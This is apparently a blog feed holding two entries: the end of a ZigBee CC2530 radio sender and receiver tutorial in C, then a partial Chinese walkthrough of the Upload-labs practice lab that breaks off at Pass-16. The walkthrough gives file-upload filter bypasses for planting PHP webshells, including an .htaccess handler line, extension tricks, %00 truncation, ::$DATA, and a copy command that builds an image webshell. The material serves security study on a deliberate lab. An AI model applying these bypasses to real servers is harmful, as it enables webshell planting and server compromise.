<span class="token keyword">char</span> SendPacket<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token number">0x0c</span><span class="token punctuation">,</span><span class="token number">0x61</span><span class="token punctuation">,</span><span class="token number">0x88</span><span class="token punctuation">,</span><span class="token number">0x00</span><span class="token punctuation">,</span><span class="token number">0x07</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token number">0xEF</span><span class="token punctuation">,</span><span class="token number">0xBE</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token number">0x50</span><span class="token punctuation">,</span>SENDVAL<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token comment">//第一个字节0x0C含义，这个自己后面还有12个字节要发送</span>
<span class="token comment">//第5 6个字节表示的是PANID</span>
<span class="token comment">//第7 8个字节是无线模块目标设备的网络地址 0xBEEF</span>
<span class="token comment">//第9 10就是本地模块的网络地址</span>
<span class="token comment">//11 个字节是我们有用的数据</span>
<span class="token comment">// CRC码 12 13个字节 是硬件自动追加</span>

<span class="token keyword">void</span> <span class="token function">Delay</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment">//延时函数</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">int</span> y<span class="token punctuation">,</span>x<span class="token punctuation">;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span>y<span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">;</span>y<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">;</span>y<span class="token operator">--</span><span class="token punctuation">)</span>
      <span class="token keyword">for</span><span class="token punctuation">(</span>x<span class="token operator">=</span><span class="token number">30</span><span class="token punctuation">;</span>x<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">;</span>x<span class="token operator">--</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">void</span> <span class="token function">Init32M</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment">//设置为32M晶振</span>
<span class="token punctuation">&#123;</span>
   SLEEPCMD <span class="token operator">&amp;=</span><span class="token number">0xFB</span><span class="token punctuation">;</span><span class="token comment">//1111 1011 开启2个高频时钟源</span>
   <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token operator">==</span><span class="token punctuation">(</span>SLEEPSTA <span class="token operator">&amp;</span> <span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 0100 0000 等待32M稳定</span>
   <span class="token function">Delay</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   CLKCONCMD <span class="token operator">&amp;=</span><span class="token number">0xF8</span><span class="token punctuation">;</span><span class="token comment">//1111 1000 不分频输出</span>
   CLKCONCMD <span class="token operator">&amp;=</span><span class="token number">0XBF</span><span class="token punctuation">;</span><span class="token comment">//1011 1111 设置32M作为系统主时钟</span>
   <span class="token keyword">while</span><span class="token punctuation">(</span>CLKCONSTA <span class="token operator">&amp;</span> <span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//0100 0000 等待32M成功成为当前系统主时钟</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">void</span> <span class="token function">KeysIntCfg</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment">//设置开关中断</span>
<span class="token punctuation">&#123;</span><span class="token comment">//Key3  Key4   Key5</span>
     
     IEN2<span class="token operator">|=</span><span class="token number">0x10</span><span class="token punctuation">;</span><span class="token comment">//开P1IE组中断</span>
     P1IEN<span class="token operator">|=</span><span class="token number">0x02</span><span class="token punctuation">;</span><span class="token comment">//开Key3组内中断</span>
     PICTL<span class="token operator">|=</span><span class="token number">0x02</span><span class="token punctuation">;</span><span class="token comment">//设置P1_1为下降沿 </span>
     EA<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>      <span class="token comment">//开总中断</span>
<span class="token punctuation">&#125;</span>


<span class="token keyword">void</span> <span class="token function">halRfInit</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token comment">//无线通信的初始化  初始化相关的寄存器，配置工作信道，和PANID</span>
<span class="token punctuation">&#123;</span>
    EA<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
    FRMCTRL0 <span class="token operator">|=</span> <span class="token number">0x60</span><span class="token punctuation">;</span>

    <span class="token comment">// Recommended RX settings  </span>
    TXFILTCFG <span class="token operator">=</span> <span class="token number">0x09</span><span class="token punctuation">;</span>
    AGCCTRL1 <span class="token operator">=</span> <span class="token number">0x15</span><span class="token punctuation">;</span>
    FSCAL1 <span class="token operator">=</span> <span class="token number">0x00</span><span class="token punctuation">;</span>
    
    <span class="token comment">// enable RXPKTDONE interrupt  </span>
    RFIRQM0 <span class="token operator">|=</span> <span class="token number">0x40</span><span class="token punctuation">;</span><span class="token comment">//把射频接收中断打开</span>
    <span class="token comment">// enable general RF interrupts</span>
    IEN2 <span class="token operator">|=</span> <span class="token number">0x01</span><span class="token punctuation">;</span>
    
    FREQCTRL <span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token number">25</span><span class="token operator">-</span><span class="token number">11</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//(MIN_CHANNEL + (channel - MIN_CHANNEL) * CHANNEL_SPACING);   </span>
                     <span class="token comment">//设置载波为2475M</span>
    PAN_ID0<span class="token operator">=</span><span class="token number">0x07</span><span class="token punctuation">;</span>
    PAN_ID1<span class="token operator">=</span><span class="token number">0x20</span><span class="token punctuation">;</span> <span class="token comment">//0x2007   </span>
<span class="token comment">//halRfRxInterruptConfig(basicRfRxFrmDoneIsr);    </span>
    RFST <span class="token operator">=</span> <span class="token number">0xEC</span><span class="token punctuation">;</span><span class="token comment">//清接收缓冲器</span>
    RFST <span class="token operator">=</span> <span class="token number">0xE3</span><span class="token punctuation">;</span><span class="token comment">//开启接收使能 </span>
    EA<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>    
<span class="token punctuation">&#125;</span>

<span class="token keyword">void</span> <span class="token function">RFSend</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>pstr<span class="token punctuation">,</span><span class="token keyword">char</span> len<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">char</span> i<span class="token punctuation">;</span>
    RFST <span class="token operator">=</span> <span class="token number">0xEC</span><span class="token punctuation">;</span> <span class="token comment">//确保接收是空的</span>
    RFST <span class="token operator">=</span> <span class="token number">0xE3</span><span class="token punctuation">;</span> <span class="token comment">//清接收标志位</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>FSMSTAT1 <span class="token operator">&amp;</span> <span class="token number">0x22</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//等待射频发送准备好</span>
    RFST <span class="token operator">=</span> <span class="token number">0xEE</span><span class="token punctuation">;</span><span class="token comment">//确保发送队列是空</span>
    RFIRQF1 <span class="token operator">&amp;=</span> <span class="token operator">~</span><span class="token number">0x02</span><span class="token punctuation">;</span><span class="token comment">//清发送标志位</span>
<span class="token comment">//为数据发送做好准备工作</span>

    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>len<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
       RFD<span class="token operator">=</span>pstr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>  <span class="token comment">//循环的作用是把我们要发送的数据全部压到发送缓冲区里面</span>
    
    RFST <span class="token operator">=</span> <span class="token number">0xE9</span><span class="token punctuation">;</span> <span class="token comment">//这个寄存器一旦被设置为0xE9,发送缓冲区的数据就被发送出去</span>
    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>RFIRQF1 <span class="token operator">&amp;</span> <span class="token number">0x02</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//等待发送完成</span>
    RFIRQF1 <span class="token operator">=</span> <span class="token operator">~</span><span class="token number">0x02</span><span class="token punctuation">;</span><span class="token comment">//清发送完成标志</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
   <span class="token function">LS164_Cfg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//74LS164控制数码管的初始化</span>
   <span class="token function">Init32M</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//主时钟晶振工作在32M </span>
   <span class="token function">KeysIntCfg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
   
   <span class="token function">halRfInit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//无线通信的初始化  初始化相关的寄存器，配置工作信道，和PANID</span>
   
  SHORT_ADDR0<span class="token operator">=</span><span class="token number">0x50</span><span class="token punctuation">;</span>
  SHORT_ADDR1<span class="token operator">=</span><span class="token number">0x20</span><span class="token punctuation">;</span><span class="token comment">//设置本模块地址  设置本模块的网络地址0x2050</span>
  <span class="token comment">//大小端模式问题，</span>
  
    <span class="token function">LS164_BYTE</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">pragma</span> <span class="token expression">vector<span class="token operator">=</span>P1INT_VECTOR</span></span>
__interrupt <span class="token keyword">void</span> <span class="token function">Key3_ISR</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//P1_1</span>
<span class="token punctuation">&#123;</span>
     <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token number">0x02</span> <span class="token operator">&amp;</span> P1IFG<span class="token punctuation">)</span>
     <span class="token punctuation">&#123;</span>
         <span class="token function">Delay</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
         <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token operator">==</span>P1_1<span class="token punctuation">)</span>
         <span class="token punctuation">&#123;</span>
           P1DIR <span class="token operator">|=</span><span class="token number">0X01</span><span class="token punctuation">;</span>
           P1_0 <span class="token operator">^=</span><span class="token number">1</span><span class="token punctuation">;</span>
           <span class="token function">RFSend</span><span class="token punctuation">(</span>SendPacket<span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
         <span class="token punctuation">&#125;</span>
     <span class="token punctuation">&#125;</span>

     P1IFG<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
     P1IF<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>


<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">pragma</span> <span class="token expression">vector<span class="token operator">=</span>RF_VECTOR</span></span>
__interrupt <span class="token keyword">void</span> <span class="token function">RF_IRQ</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span><span class="token comment">//这个是射频中断函数，当小灯模块接收到开关模块发送来的数据时，小灯模块的CPU就会进入中断函数执行</span>
    EA<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span> RFIRQF0 <span class="token operator">&amp;</span> <span class="token number">0x40</span> <span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>            
        RFIRQF0<span class="token operator">&amp;=</span> <span class="token operator">~</span><span class="token number">0x40</span><span class="token punctuation">;</span>   <span class="token comment">// Clear RXPKTDONE interrupt</span>
    <span class="token punctuation">&#125;</span>
    S1CON<span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>   <span class="token comment">// Clear general RF interrupt flag</span>
    RFST <span class="token operator">=</span> <span class="token number">0xEC</span><span class="token punctuation">;</span><span class="token comment">//清接收缓冲器</span>
    RFST <span class="token operator">=</span> <span class="token number">0xE3</span><span class="token punctuation">;</span><span class="token comment">//开启接收使能 </span>
    EA<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
</code></pre>

<p>接收：</p>
<pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;ioCC2530.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">"74LS164_8LED.h"</span></span>
<span class="token keyword">void</span> <span class="token function">Delay</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">int</span> y<span class="token punctuation">,</span>x<span class="token punctuation">;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span>y<span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">;</span>y<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">;</span>y<span class="token operator">--</span><span class="token punctuation">)</span>
      <span class="token keyword">for</span><span class="token punctuation">(</span>x<span class="token operator">=</span><span class="token number">30</span><span class="token punctuation">;</span>x<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">;</span>x<span class="token operator">--</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">void</span> <span class="token function">Init32M</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
   SLEEPCMD <span class="token operator">&amp;=</span><span class="token number">0xFB</span><span class="token punctuation">;</span><span class="token comment">//1111 1011 开启2个高频时钟源</span>
   <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token operator">==</span><span class="token punctuation">(</span>SLEEPSTA <span class="token operator">&amp;</span> <span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 0100 0000 等待32M稳定</span>
   <span class="token function">Delay</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   CLKCONCMD <span class="token operator">&amp;=</span><span class="token number">0xF8</span><span class="token punctuation">;</span><span class="token comment">//1111 1000 不分频输出</span>
   CLKCONCMD <span class="token operator">&amp;=</span><span class="token number">0XBF</span><span class="token punctuation">;</span><span class="token comment">//1011 1111 设置32M作为系统主时钟</span>
   <span class="token keyword">while</span><span class="token punctuation">(</span>CLKCONSTA <span class="token operator">&amp;</span> <span class="token number">0x40</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//0100 0000 等待32M成功成为当前系统主时钟</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">void</span> <span class="token function">Uart0_Cfg</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
   PERCFG <span class="token operator">&amp;=</span><span class="token number">0xFE</span><span class="token punctuation">;</span><span class="token comment">//把这个寄存器的第零位强行清零  1111 1110 </span>
   <span class="token comment">//就是把串口0的脚位置配置在备用位置1 即P0_2  P0_3</span>
   
   P0SEL  <span class="token operator">|=</span><span class="token number">0x0C</span><span class="token punctuation">;</span><span class="token comment">//让P0_2  P0_3这两个脚工作在片上外设模式,而不是普通IO口       0000 1100</span>
   
   U0CSR <span class="token operator">|=</span><span class="token number">0xC0</span><span class="token punctuation">;</span>
   U0UCR <span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">//串口0 典型的串口配置  校验位 停止位之类的东西</span>
   
   U0GCR <span class="token operator">=</span><span class="token number">11</span><span class="token punctuation">;</span>
   U0BAUD <span class="token operator">=</span><span class="token number">216</span><span class="token punctuation">;</span><span class="token comment">//就是重官方数据手册中波特率表格中参照115200时的 配置值，前提是系统时钟在32M</span>
   
   IEN0 <span class="token operator">|=</span><span class="token number">0x04</span><span class="token punctuation">;</span> <span class="token comment">//开接收数据的中断  0000 0100</span>
   EA<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">void</span> <span class="token function">Uart0SendByte</span><span class="token punctuation">(</span><span class="token keyword">char</span> SendByte<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    U0DBUF<span class="token operator">=</span>SendByte<span class="token punctuation">;</span>  <span class="token comment">//把我们收到的数据通过串口再返回发出去</span>
    <span class="token keyword">while</span><span class="token punctuation">(</span>UTX0IF<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    UTX0IF<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">void</span> <span class="token function">halRfInit</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    EA<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
    FRMCTRL0 <span class="token operator">|=</span> <span class="token number">0x60</span><span class="token punctuation">;</span>

    <span class="token comment">// Recommended RX settings  </span>
    TXFILTCFG <span class="token operator">=</span> <span class="token number">0x09</span><span class="token punctuation">;</span>
    AGCCTRL1 <span class="token operator">=</span> <span class="token number">0x15</span><span class="token punctuation">;</span>
    FSCAL1 <span class="token operator">=</span> <span class="token number">0x00</span><span class="token punctuation">;</span>
    <span class="token comment">// enable RXPKTDONE interrupt  </span>
    RFIRQM0 <span class="token operator">|=</span> <span class="token number">0x40</span><span class="token punctuation">;</span>
    <span class="token comment">// enable general RF interrupts</span>
    IEN2 <span class="token operator">|=</span> <span class="token number">0x01</span><span class="token punctuation">;</span>
    
    FREQCTRL <span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token number">25</span><span class="token operator">-</span><span class="token number">11</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//(MIN_CHANNEL + (channel - MIN_CHANNEL) * CHANNEL_SPACING);    </span>
    PAN_ID0<span class="token operator">=</span><span class="token number">0x07</span><span class="token punctuation">;</span>
    PAN_ID1<span class="token operator">=</span><span class="token number">0x20</span><span class="token punctuation">;</span>    
<span class="token comment">//halRfRxInterruptConfig(basicRfRxFrmDoneIsr);    </span>
    RFST <span class="token operator">=</span> <span class="token number">0xEC</span><span class="token punctuation">;</span><span class="token comment">//清接收缓冲器</span>
    RFST <span class="token operator">=</span> <span class="token number">0xE3</span><span class="token punctuation">;</span><span class="token comment">//开启接收使能 </span>
    EA<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>    
<span class="token punctuation">&#125;</span>


<span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
   <span class="token function">LS164_Cfg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//74LS164控制数码管的初始化</span>
   <span class="token function">Init32M</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//主时钟晶振工作在32M </span>
   <span class="token function">halRfInit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token function">Uart0_Cfg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   
  SHORT_ADDR0<span class="token operator">=</span><span class="token number">0xEF</span><span class="token punctuation">;</span>
  SHORT_ADDR1<span class="token operator">=</span><span class="token number">0xBE</span><span class="token punctuation">;</span><span class="token comment">//设置本模块地址  0xBEEF</span>
  
    <span class="token function">LS164_BYTE</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">void</span> <span class="token function">RevRFProc</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
 <span class="token keyword">static</span> <span class="token keyword">char</span> len<span class="token punctuation">;</span>
 <span class="token keyword">static</span> <span class="token keyword">char</span>  ch<span class="token punctuation">;</span>

    len<span class="token operator">=</span>ch<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
    RFIRQM0 <span class="token operator">&amp;=</span> <span class="token operator">~</span><span class="token number">0x40</span><span class="token punctuation">;</span>
    IEN2 <span class="token operator">&amp;=</span> <span class="token operator">~</span><span class="token number">0x01</span><span class="token punctuation">;</span>
    EA<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>
 
    len<span class="token operator">=</span>RFD<span class="token punctuation">;</span><span class="token comment">//读第一个字节判断这一串数据后面有几个字节；</span>
    <span class="token comment">//len=0x0C 12</span>

    <span class="token keyword">while</span> <span class="token punctuation">(</span>len<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span> 
    <span class="token punctuation">&#123;</span><span class="token comment">//只要后面还有数据那么就把他都从接受缓冲区取出来</span>
        ch<span class="token operator">=</span>RFD<span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token operator">==</span>len<span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span><span class="token comment">//如果倒数第三个字节等于7，那么我们把LED0取反</span>
           <span class="token function">LS164_BYTE</span><span class="token punctuation">(</span>ch<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        

        len<span class="token operator">--</span><span class="token punctuation">;</span>
     <span class="token punctuation">&#125;</span>     
    EA<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token comment">// enable RXPKTDONE interrupt</span>
    RFIRQM0 <span class="token operator">|=</span> <span class="token number">0x40</span><span class="token punctuation">;</span>
    <span class="token comment">// enable general RF interrupts</span>
    IEN2 <span class="token operator">|=</span> <span class="token number">0x01</span><span class="token punctuation">;</span>        
<span class="token punctuation">&#125;</span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">pragma</span> <span class="token expression">vector<span class="token operator">=</span>RF_VECTOR</span></span>
__interrupt <span class="token keyword">void</span> <span class="token function">RF_IRQ</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span><span class="token comment">//这个是射频中断函数，当小灯模块接收到开关模块发送来的数据时，小灯模块的CPU就会进入中断函数执行</span>
    EA<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span> RFIRQF0 <span class="token operator">&amp;</span> <span class="token number">0x40</span> <span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        
        <span class="token function">RevRFProc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
             
        RFIRQF0<span class="token operator">&amp;=</span> <span class="token operator">~</span><span class="token number">0x40</span><span class="token punctuation">;</span>   <span class="token comment">// Clear RXPKTDONE interrupt</span>
    <span class="token punctuation">&#125;</span>
    S1CON<span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>                   <span class="token comment">// Clear general RF interrupt flag</span>
    RFST <span class="token operator">=</span> <span class="token number">0xEC</span><span class="token punctuation">;</span><span class="token comment">//清接收缓冲器</span>
    RFST <span class="token operator">=</span> <span class="token number">0xE3</span><span class="token punctuation">;</span><span class="token comment">//开启接收使能 </span>
    EA<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

]]></content>
      <categories>
        <category>ZigBee</category>
      </categories>
      <tags>
        <tag>ZigBee</tag>
      </tags>
  </entry>
  <entry>
    <title>Upload-labs靶场</title>
    <url>/posts/76ab3a0e/</url>
    <content><![CDATA[<h3 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h3><p>前端验证，审查元素删除HTML中的onsubmit属性再上传即可</p>
<span id="more"></span>

<h3 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h3><p>MIME验证抓包修改 <code>Content-Type</code> 为 <code>image/jpeg</code> 后Forward即可</p>
<h3 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h3><p>黑名单绕过，上传<code>.phtml</code>后缀即可</p>
<h3 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h3><p>黑名单过滤了大多数后缀，于是上传<code>.htaccess</code>文件，内容如下，再上传后缀为<code>.jpg</code>的图片马即可</p>
<pre class="language-none"><code class="language-none">SetHandler application&#x2F;x-httpd-php</code></pre>

<h3 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h3><p>黑名单过滤的绝大多数后缀名，并未进行大小写转换，于是上传<code>.Php</code>后缀即可</p>
<h3 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h3><p>黑名单绕过，抓包在后缀名最后加上一个空格即可上传绕过</p>
<h3 id="Pass-07"><a href="#Pass-07" class="headerlink" title="Pass-07"></a>Pass-07</h3><p>没进行删除末尾的点的函数，抓包在后缀名后加上一个点即可</p>
<h3 id="Pass-08"><a href="#Pass-08" class="headerlink" title="Pass-08"></a>Pass-08</h3><p>未过滤<code>::$DATA</code>，利用Windows解析特性，抓包在后缀名后面添加上<code>::$DATA</code>即可绕过</p>
<blockquote>
<p>php在window的时候如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持”::$DATA”之前的文件名</p>
</blockquote>
<h3 id="Pass-09"><a href="#Pass-09" class="headerlink" title="Pass-09"></a>Pass-09</h3><p>此处文件路径拼接的是处理后的文件名，于是上传后缀为<code>php. .</code>的文件即可</p>
<h3 id="Pass-10"><a href="#Pass-10" class="headerlink" title="Pass-10"></a>Pass-10</h3><p>函数将黑名单内的后缀名替换成空，这里双写后缀名<code>.pphphp</code>即可</p>
<h3 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h3><p>白名单验证，提示上传路径可控，发现在上传一个文件之后就会get一个文件路径参数，于是利用%00截断，使得文件路径为upload/1.php%00(文件名)，后面的文件没就就没读取了，这样访问upload/1.php即可获得木马路径。</p>
<p>版本要求：</p>
<blockquote>
<p>php版本要小于5.3.4，5.3.4及以上已经修复该问题</p>
<p>magic_quotes_gpc需要为OFF状态</p>
</blockquote>
<h3 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h3><p>与上题不一样这题改用了POST方法，一样%00截断抓包改即可，php版本需要注意</p>
<blockquote>
<p>因为是十六进制所以这种截断叫做是<code>0x00截断</code>，其实是<code>%00截断</code>最终被<code>url解码</code>还是会变成<code>0x00</code>的。在<code>url</code>中<code>%00</code>表示<code>ascll</code>码中的<code>0</code>，而<code>ascii</code>中<code>0</code>作为特殊字符保留，表示字符串结束，所以当<code>url</code>中出现<code>%00</code>时就会认为读取已结束。</p>
</blockquote>
<h3 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h3><p>cmd到两个文件所在路径下用copy命令制作图片马</p>
<blockquote>
<p>png：copy 1.png/b + 1.php/a shell.png</p>
<p>jpg：copy 1.jpg/b + 1.php/a shell.jpg</p>
<p>jpg：copy 1.gif/b + 1.php/a shell.gif</p>
</blockquote>
<p>制作好后上传，在文件包含漏洞页面getfile参数进行读取解析即可 <code>?file=./upload/6420200209090636.png</code>（三种都一样）</p>
<h3 id="Pass-14"><a href="#Pass-14" class="headerlink" title="Pass-14"></a>Pass-14</h3><p>后台代码改了，用的getimagesize函数判断后缀，但是解题方法还是和上题一样</p>
<h3 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass-15"></a>Pass-15</h3><p>本题用了php_exif模块来判断文件类型，图片马一样可以绕过</p>
<blockquote>
<p>用于读取一个图像的第一个字节并检查其签名</p>
<p>如果发现了恰当的签名则返回一个对应的常量，否则返回false</p>
</blockquote>
<h3 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass-16"></a>Pass-16</h3><p>参考：<a href="https://xz.aliyun.com/t/2657">https://xz.aliyun.com/t/2657</a></p>
<p>这题存在对图片的二次渲染</p>
<h4 id="GIF"><a href="#GIF" class="headerlink" title="GIF"></a>GIF</h4><p>将做好的GIF图片马上传上去，利用文件包含漏洞进行读取，发现图片中的php代码并没有被解析，并且图片进行了二次渲染重构，内容被改写，于是使用GIF图的处理方法，将图片内容保存下来，与上传前的图片马作比较，发现有一部分没有被重写（如下图），于是将一句话插入到这一部分内容中，保存，重新上传，成功解析</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/Upload-labs%E9%9D%B6%E5%9C%BA/image-20200209171705862.png" alt loading="lazy"></p>
<h4 id="PNG"><a href="#PNG" class="headerlink" title="PNG"></a>PNG</h4><h5 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h5><p>这里有国外大牛的脚本</p>
